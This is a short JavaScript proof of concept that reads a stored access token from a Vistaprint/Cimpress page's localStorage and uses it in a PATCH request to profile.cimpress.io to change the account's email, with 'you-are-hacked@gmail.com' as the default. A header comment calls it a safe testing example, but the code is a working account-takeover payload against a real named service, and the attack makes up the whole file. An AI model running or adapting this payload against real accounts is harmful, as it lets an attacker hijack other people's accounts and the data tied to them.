// SAFE example for testing only — do NOT use to target others.
// Prompt appears only if localStorage contains "vp-access-token".

const stored = localStorage.getItem("vp-access-token"); // might be null

if (!stored) {
  console.log('No vp-access-token found in localStorage — nothing to do.');
} else {
  let parsed = null;
  try {
    parsed = JSON.parse(stored);
  } catch (e) {
    console.warn("Failed to parse stored token:", e);
  }

  const token = parsed?.value ?? null;
  if (!token) {
    console.log('Token value missing inside stored item — aborting.');
  } else {
    // Only show the prompt because the localStorage item (and token) exist
    let emails = prompt("Enter the email you want (default -> you-are-hacked@gmail.com)");
    if (emails === null) { // user pressed Cancel
      console.log("Prompt cancelled — aborting.");
    } else {
      if (emails.trim() === "") {
        emails = "you-are-hacked@gmail.com";
      }

      const url = 'https://profile.cimpress.io/v1/ozoDdrmewShEcbUDWX8J3V/profile/me';
      const payload = { email: emails, language: 'en-US' };

      async function patchProfile() {
        try {
          const res = await fetch(url, {
            method: 'PATCH',
            mode: 'cors',
            cache: 'no-store',
            headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify(payload)
          });

          if (!res.ok) {
            const txt = await res.text().catch(() => '');
            throw new Error(`HTTP ${res.status} ${res.statusText} - ${txt}`);
          }

          const data = await res.json().catch(() => null);
          console.log('Success:', data);
          return data;
        } catch (err) {
          console.error('Request failed:', err);
          throw err;
        }
      }

      patchProfile();
    }
  }
}
